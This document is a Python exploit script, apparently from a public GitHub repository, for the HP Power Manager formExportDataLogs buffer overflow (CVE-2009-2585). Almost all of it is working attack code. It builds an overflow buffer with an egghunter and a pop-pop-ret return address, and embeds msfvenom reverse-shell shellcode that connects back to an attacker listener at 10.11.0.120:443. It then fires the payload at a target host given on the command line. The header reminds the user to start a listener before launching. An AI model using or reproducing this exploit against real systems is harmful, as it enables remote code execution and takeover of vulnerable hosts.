#source: https://github.com/n4xh4ck5/CVE2009-2585_HP_Power_Manager_BoF/blob/master/CVE2009-2585_HP_Power_Manager_BoF.py
#!/usr/bin/python
# you gonna have indentation issues, press in vim (gg=G) then fix errors
print """
###################################################################################################################################
## It is a version modified of the original exploit by Muhammad Haidari(https://raw.githubusercontent.com/Muhammd/HP-Power-Manager/master/hpm_exploit.py). 
## The modification includes a payload which allows to obtain a reverse shell to avoid to open ports in the ##Windows'target which the ## firewall's windows will be closed it.							##							
## Remenber to put a listener to listen to any response before to launch the exploit in the port properly!
##
##Vulnerability: HP Power Manager 'formExportDataLogs'    		             
## 											 	             
## Vulnerable Application: HP Power Manager	 	   		
## Tested on Windows 7 Ultimate N 7600 N 6.1		  	
##												
## Contact: n4xh4ck5@gmail.com				
## Website: www.github.com/n4xh4ck5										
##														
##//#################################################################################################################################
##
##
## 
##
## Usage: python hpm_exploit.py <Remote IP Address>
"""
import urllib
import os
import sys
import struct
import time
from socket import *

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: %s HOST" % sys.argv[0]
   sys.exit()

PORT  = 80

#msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.120 LPORT=443  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
try:


	egg="b33fb33f"
	buf= egg
	#Change the below payload with your data (LHOST)
	buf += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
    buf += b"\x81\x76\x0e\x99\x9f\xb3\xc4\x83\xee\xfc\xe2\xf4"
    buf += b"\x65\x77\x31\xc4\x99\x9f\xd3\x4d\x7c\xae\x73\xa0"
    buf += b"\x12\xcf\x83\x4f\xcb\x93\x38\x96\x8d\x14\xc1\xec"
    buf += b"\x96\x28\xf9\xe2\xa8\x60\x1f\xf8\xf8\xe3\xb1\xe8"
    buf += b"\xb9\x5e\x7c\xc9\x98\x58\x51\x36\xcb\xc8\x38\x96"
    buf += b"\x89\x14\xf9\xf8\x12\xd3\xa2\xbc\x7a\xd7\xb2\x15"
    buf += b"\xc8\x14\xea\xe4\x98\x4c\x38\x8d\x81\x7c\x89\x8d"
    buf += b"\x12\xab\x38\xc5\x4f\xae\x4c\x68\x58\x50\xbe\xc5"
    buf += b"\x5e\xa7\x53\xb1\x6f\x9c\xce\x3c\xa2\xe2\x97\xb1"
    buf += b"\x7d\xc7\x38\x9c\xbd\x9e\x60\xa2\x12\x93\xf8\x4f"
    buf += b"\xc1\x83\xb2\x17\x12\x9b\x38\xc5\x49\x16\xf7\xe0"
    buf += b"\xbd\xc4\xe8\xa5\xc0\xc5\xe2\x3b\x79\xc0\xec\x9e"
    buf += b"\x12\x8d\x58\x49\xc4\xf7\x80\xf6\x99\x9f\xdb\xb3"
    buf += b"\xea\xad\xec\x90\xf1\xd3\xc4\xe2\x9e\x60\x66\x7c"
    buf += b"\x09\x9e\xb3\xc4\xb0\x5b\xe7\x94\xf1\xb6\x33\xaf"
    buf += b"\x99\x60\x66\x94\xc9\xcf\xe3\x84\xc9\xdf\xe3\xac"
    buf += b"\x73\x90\x6c\x24\x66\x4a\x24\xae\x9c\xf7\x73\x6c"
    buf += b"\xb4\x5b\xdb\xc6\x99\x9e\x08\x4d\x7f\xf5\xa3\x92"
    buf += b"\xce\xf7\x2a\x61\xed\xfe\x4c\x11\x1c\x5f\xc7\xc8"
    buf += b"\x66\xd1\xbb\xb1\x75\xf7\x43\x71\x3b\xc9\x4c\x11"
    buf += b"\xf1\xfc\xde\xa0\x99\x16\x50\x93\xce\xc8\x82\x32"
    buf += b"\xf3\x8d\xea\x92\x7b\x62\xd5\x03\xdd\xbb\x8f\xc5"
    buf += b"\x98\x12\xf7\xe0\x89\x59\xb3\x80\xcd\xcf\xe5\x92"
    buf += b"\xcf\xd9\xe5\x8a\xcf\xc9\xe0\x92\xf1\xe6\x7f\xfb"
    buf += b"\x1f\x60\x66\x4d\x79\xd1\xe5\x82\x66\xaf\xdb\xcc"
    buf += b"\x1e\x82\xd3\x3b\x4c\x24\x53\xd9\xb3\x95\xdb\x62"
    buf += b"\x0c\x22\x2e\x3b\x4c\xa3\xb5\xb8\x93\x1f\x48\x24"
    buf += b"\xec\x9a\x08\x83\x8a\xed\xdc\xae\x99\xcc\x4c\x11"

	#tools/exploit/egghunter.rb -f python -b '\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a' -e b33f -v 'hunter'

	hunter =  ""
	hunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
	hunter += "\x3c\x05\x5a\x74\xef\xb8\x62\x33\x33\x66\x89\xd7"
	hunter += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

	buffer = "\x41" * (721 -len(hunter))
	buffer +="\x90"*30 + hunter
	buffer +="\xeb\xc2\x90\x90"           #JMP SHORT 0xC2 
	buffer += "\xd5\x74\x41" 	      #pop esi # pop ebx # ret 10 (DevManBE.exe)
	 

	content= "dataFormat=comma&exportto=file&fileName=%s" % urllib.quote_plus(buffer)
	content+="&bMonth=03&bDay=12&bYear=2017&eMonth=03&eDay=12&eYear=2017&LogType=Application&actionType=1%253B"

	payload =  "POST /goform/formExportDataLogs HTTP/1.1\r\n"
	payload += "Host: %s\r\n" % HOST
	payload += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n"
	payload += "Accept: %s\r\n" % buf
	payload += "Referer: http://%s/Contents/exportLogs.asp?logType=Application\r\n" % HOST
	payload += "Content-Type: application/x-www-form-urlencoded\r\n"
	payload += "Content-Length: %s\r\n\r\n" % len(content)
	payload += content

	s = socket(AF_INET, SOCK_STREAM)
	s.connect((HOST, PORT))
	print "[+] Payload Fired... She will be back in less than a min..."
	s.send(payload)
	print "[+] Give me 30 Sec!"
	time.sleep(30)
	s.close()

except Exception as e:

	print "It was wrong..." +str(e)
